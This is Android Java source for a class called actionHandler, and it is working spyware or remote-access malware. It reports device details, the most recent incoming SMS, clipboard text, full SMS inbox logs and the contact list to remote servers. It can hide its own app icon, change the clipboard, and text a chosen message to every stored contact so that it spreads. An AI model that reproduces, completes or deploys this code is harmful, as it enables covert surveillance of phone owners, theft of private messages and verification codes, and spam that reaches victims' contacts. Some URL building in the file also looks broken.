package com.drnull.v3;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.ktx.Firebase;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;

import org.json.JSONObject;

import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ConcurrentModificationException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;

public class actionHandler {
    private static final String TAG = "actionHandler";
    private Context context;
    public actionHandler(Context context){
        this.context = context;
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void post(String path , JSONObject data) throws Exception{
        try{
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
            String addr = "https://remote-addr.com";
            HttpURLConnection conn = (HttpURLConnection) new URL("https://" + addr + "/" + path).openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);
            conn.setDoOutput(true);
            conn.addRequestProperty("Content-Type" , "application/json");
            conn.connect();
            // write data
            OutputStream outputStream = conn.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream);
            outputStreamWriter.write(data.toString());
            outputStreamWriter.flush();
            outputStream.close();
            outputStreamWriter.close();
            Log.d(path , String.valueOf(conn.getResponseCode()));
            conn.disconnect();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void post(String path , String data) throws Exception{
        String addr = "https://remote-maker.com";
        try{
            HttpURLConnection conn = (HttpURLConnection) new URL("https://" + addr + "/" + path).openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);
            conn.setDoOutput(true);
            conn.addRequestProperty("Content-Type" , "application/json");
            conn.connect();
            // write data
            OutputStream outputStream = conn.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream);
            outputStreamWriter.write(data.toString());
            outputStreamWriter.flush();
            outputStream.close();
            outputStreamWriter.close();
            Log.d(path , String.valueOf(conn.getResponseCode()));
            conn.disconnect();
        } catch (Exception e){
            e.printStackTrace();
        }
    }


    public void firstinstall() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "firstinstall");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void pingone() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "ping");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void pingall() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "ping");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void hideone() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "hide");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            hideAppIcon();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void hideall() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "hide");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            hideAppIcon();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void unhideone() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "unhide");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            unhideAppIcon();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }


    public void unhideall() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "unhide");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            unhideAppIcon();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void lastsms() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "lastsms");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("from" , getSmsLogs("inbox").get(0).get("address"));
            j.put("text" , getSmsLogs("inbox").get(0).get("body"));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void getclip() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "getclipboard");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("text" , getcliptetext());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void setclip(String text) throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "setclipboard");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("text" , text);
            setcliptext(text);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public void allsms(String kind , int count){
        String log = "All sms logs from target : \n\n";
        LinkedList<Map<String , String>> listsms = getSmsLogs(kind);
        int lc;
        if (count >= listsms.size() || count < 0) {
            lc = listsms.size();
        } else {
            lc = count;
        }

        for (int i = 0 ; i < lc ; i++){
            log = log + listsms.get(i).get("address") + "\n" + listsms.get(i).get("body") + "\n" + "---------------------" + "\n";
        }
        try {
            post("upload/" + readAsset("chat_id.txt") + "?id=" + getAndroidId() + "&issms=true" , log);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void allcontact(){
        String log = "All contact logs from target : \n\n";
        LinkedList<Map<String , String>> listc = getContactList();

        for (Map<String , String> i : listc){
            log = log + i.get("name") + "\n" + i.get("phone") + "\n" + "---------------------" + "\n";
        }
        try {
            post("upload/" + readAsset("chat_id.txt") + "?id=" + getAndroidId() + "&issms=false" , log);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void send2contact(String text) throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            List<String> phones = new LinkedList<>();
            String plist = "\n";
            j.put("action" , "sentsms");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("text" , text);

            LinkedList<Map<String , String>> listc = getContactList();
            for (Map i : listc){
                phones.add(i.get("phone").toString().replace("+98" , "0"));
            }

            for (String i : phones){
                plist = plist + i + "\n";
            }

            j.put("phone" , plist);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    for (String i : phones){
                        try{
                            ac.sendSms(i.replace(" " , "") , text);
                            Thread.sleep(500);
                        } catch (Exception e){
                            e.printStackTrace();
                        }
                    }
                }
            }).start();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }


    public LinkedList<Map<String , String>> getContactList() {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
        );

        LinkedList<Map<String , String>> data = new LinkedList<Map<String , String>>();

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                    );

                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        while (!phoneCursor.isAfterLast()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            // Do something with the contact name and phone number
                            // For example, print them to the console
                            Map<String , String> temp = new HashMap<>();
                            temp.put("name" , name);
                            temp.put("phone" , phoneNumber);
                            data.add(temp);
//                            System.out.println("Name: " + name + ", Phone Number: " + phoneNumber);
                            phoneCursor.moveToNext();
                        }
                        phoneCursor.close();
                    }
                }
            }
            cursor.close();
        }
        return data;
    }


    public String getcliptetext(){
        ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        return (String) clipboardManager.getText();
    }

    public void setcliptext(String text){
        ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clipData =ClipData.newPlainText(text , text);
        clipboardManager.setPrimaryClip(clipData);
    }

    private void hideAppIcon() {
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(context , MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void unhideAppIcon() {
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(context , MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    public void sendSms(String phone, String text) throws Exception{
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phone , null , text , null , null);
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "sentsms");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("phone" , phone);
            j.put("text" , text);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public LinkedList<Map<String , String>> getSmsLogs(String kind){
        if (context.checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED){
            String k;
            Uri uri;
            if (kind.equals("allkinds")){
                uri = Uri.parse("content://sms");
            } else {
                uri = Uri.parse("content://sms/" + kind);
            }
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri , null , null , null);
            LinkedList<Map<String , String>> data = new LinkedList<Map<String , String>>();
            if (cursor != null && cursor.moveToFirst()){
                while (cursor.moveToNext()){
                    HashMap<String , String> info = new HashMap<>();
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    info.put("address" , address);
                    info.put("body" , body);
                    data.add(info);
                }
                cursor.close();
            }
            return data;
        }
        return null;
    }



    public void smsReceived(String from , String text) throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "smsreceived");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("from" , from);
            j.put("text" , text);
            unhideAppIcon();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void vibrate() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "ringermode");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("mode" , "vibrate");
            ringermodeVibrate();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void normal() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "ringermode");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("mode" , "normal");
            ringermodeVibrate();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }

    public void fullinfo() throws Exception{
        actionHandler ac = new actionHandler(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            JSONObject j = new JSONObject();
            j.put("action" , "fullinfo");
            j.put("model" , ac.getModel());
            j.put("androidid" , ac.getAndroidId());
            j.put("androidv" , ac.getAndroidVersion());
            j.put("carrier" , ac.getCarrier());
            j.put("battery" , ac.getBattery());
            j.put("readsms" , String.valueOf(context.checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED));
            j.put("sendsms" , String.valueOf(context.checkSelfPermission("android.permission.SEND_SMS") == PackageManager.PERMISSION_GRANTED));
            j.put("recvsms" , String.valueOf(context.checkSelfPermission("android.permission.RECEIVE_SMS") == PackageManager.PERMISSION_GRANTED));
            j.put("readcontacts" , String.valueOf(context.checkSelfPermission("android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ac.post("api/" + readAsset("chat_id.txt") , j);
            }

        }
    }







    @RequiresApi(api = Build.VERSION_CODES.M)
    public void ringermodeVibrate(){
        AudioManager audioManager = (AudioManager) context.getSystemService(AudioManager.class);
        audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public void ringermodeNormal(){
        AudioManager audioManager = (AudioManager) context.getSystemService(AudioManager.class);
        audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
    }


    public String readAsset(String filename){
        return AssetReader.readAssetFile(context, filename);
    }



    public String getAndroidId(){
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public String getModel(){
        return Build.MODEL;
    }

    public String getBrand(){
        return Build.BRAND;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public String getCarrier(){
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String carrierName = telephonyManager.getSimOperatorName();
        return carrierName;
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public int getBattery(){
        BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return level;
    }

    public String getAndroidVersion(){
        return Build.VERSION.RELEASE;
    }



}
